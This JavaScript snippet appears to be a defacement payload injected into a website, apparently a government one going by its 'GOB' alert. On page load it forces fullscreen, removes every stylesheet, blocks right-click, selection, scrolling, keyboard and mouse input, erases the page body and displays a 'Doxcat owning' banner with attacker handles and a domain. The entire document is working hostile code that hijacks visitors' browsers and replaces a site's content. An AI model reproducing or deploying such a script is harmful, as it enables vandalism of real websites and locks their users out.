    window.addEventListener('DOMContentLoaded', (event) => {
        if (document.documentElement.requestFullscreen) {
            document.documentElement.requestFullscreen();
        } else if (document.documentElement.mozRequestFullScreen) { 
            document.documentElement.mozRequestFullScreen();
        } else if (document.documentElement.webkitRequestFullscreen) { 
            document.documentElement.webkitRequestFullscreen();
        } else if (document.documentElement.msRequestFullscreen) { 
            document.documentElement.msRequestFullscreen();
        }
    
        while (document.styleSheets.length) {
            document.styleSheets[0].disabled = true;
            document.head.removeChild(document.styleSheets[0].ownerNode);
        }

document.addEventListener('contextmenu', function (event) {
    event.preventDefault();
});

document.addEventListener('selectstart', function (event) {
    event.preventDefault();
});

window.addEventListener('wheel', function (event) {
    event.preventDefault();
}, { passive: false });

document.addEventListener('keydown', function (event) {
    event.preventDefault();
});

document.addEventListener('mousedown', function (event) {
    event.preventDefault();
});

document.addEventListener('wheel', function (event) {
    event.preventDefault();
});


document.addEventListener('F12', function (event) {
    event.preventDefault();
});
    
        const style = document.createElement('style');
        style.textContent = `
            @import url('https://fonts.googleapis.com/css2?family=Poppins:wght@700&family=Roboto:wght@400&display=swap');
            body {
                background-color: #000;
                color: white;
                font-family: 'Roboto', sans-serif;
                display: flex;
                justify-content: center;
                align-items: center;
                height: 100vh;
                margin: 0;
                overflow-x: hidden;
                overflow-y: hidden;
            }
            .container {
                text-align: center;
                background-image: url('https://i.ibb.co/cb7jrzP/mussi.png');
                background-size: cover;
                background-position: center bottom;
                background-repeat: no-repeat;
                width: 90%;
                height: 90%;
            }
            .reflective-text {
                font-size: 48px;
                animation: breathing-glow 2s infinite ease-in-out;
                color: white;
                font-family: 'Poppins', sans-serif;
            }
            .small-text {
                font-size: 24px;
                color: #00ff45;
                font-family: 'Roboto', sans-serif;
            }
            @keyframes breathing-glow {
                0%, 100% {
                    text-shadow: 0 0 8px rgba(255, 255, 255, 0.5),
                    0 0 16px rgba(255, 255, 255, 0.5),
                    0 0 24px #00ff45;
                }
                50% {
                    text-shadow: 0 0 20px rgba(255, 255, 255, 0.75),
                    0 0 30px rgba(255, 255, 255, 0.75),
                    0 0 40px #00ff45;
                }
            }
        `;
        document.head.appendChild(style);
        document.body.innerHTML = '';
    
        const container = document.createElement('div');
        container.className = 'container';
        container.innerHTML = `
            <h1 class="reflective-text">Doxcat owning</h1>
            <p class="small-text">0800, Cedubi & Akma</p>
            <p class="small-text">doxcat.net</p>
        `;
        document.body.appendChild(container);
        alert("DOXCAT OWNING GOB")
    });
